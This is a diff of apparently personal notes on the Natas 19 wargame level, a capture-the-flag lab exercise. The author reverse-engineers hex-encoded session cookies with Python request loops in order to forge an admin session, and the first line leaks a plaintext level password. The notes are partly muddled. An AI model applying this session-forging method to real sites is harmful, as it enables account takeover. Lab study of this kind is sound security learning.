@@ -1,1 +1,61 @@
 password 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+same as the last challenge, but now PHPSESSID isn't sequential anymore
+based on my recon, it looksl ike it is a set pattern based on the username, so theoretically we should be able to deconstruct it...
+but to what end? i could just type in 'admin' and it would give me the corresponding ID, but that's not what we want.
+
+for test in tests:
+    url = 'http://natas19.natas.labs.overthewire.org/index.php?username={}&password='.format(test)
+    r = requests.post(url, headers=headers)
+    print(test+'\t--> '+r.cookies['PHPSESSID'])recon test results
+
+test        PHPSESSID
+a       --> 3532392d61
+aa      --> 3334302d6161
+aaa     --> 3332372d616161
+b       --> 3335372d62
+bb      --> 39382d6262
+bbb     --> 3433302d626262
+ab      --> 3533312d6162
+ba      --> 3232362d6261
+
+let's see if adding a password affects this...
+
+for test in tests:
+    url = 'http://natas19.natas.labs.overthewire.org/index.php?username={}&password={}'.format(test, test)
+    r = requests.post(url, headers=headers)
+    print(test+'\t--> '+r.cookies['PHPSESSID'])
+
+test        PHPSESSID
+a       --> 3334352d61
+aa      --> 3538322d6161
+aaa     --> 3331332d616161
+b       --> 3333322d62
+bb      --> 3133392d6262
+bbb     --> 3537332d626262
+ab      --> 3437372d6162
+ba      --> 3530392d6261
+
+ok, so adding a password DOES change the PHPSESSID value...
+hints says something about hex encoding, need to find the corresponding session ID
+
+>>> for test in tests:
+...     url = 'http://natas19.natas.labs.overthewire.org/index.php?username={}&password={}'.format(test, test)
+...     r = requests.post(url, headers=headers)
+...     print(test+'\t--> '+bytes.fromhex(r.cookies['PHPSESSID']).decode('ascii'))
+... 
+a       --> 145-a
+aa      --> 89-aa
+aaa     --> 421-aaa
+b       --> 499-b
+bb      --> 504-bb
+bbb     --> 39-bbb
+ab      --> 470-ab
+ba      --> 507-ba
+
+looks like the session ID is the number from the last challenge and the password, hex encoded.
+so....maybe we can use the same one one from the last challenge?
+last challenge PHPSESSID is 119, now we need the password...
+
+python encoding:
+'string'.encode().hex()
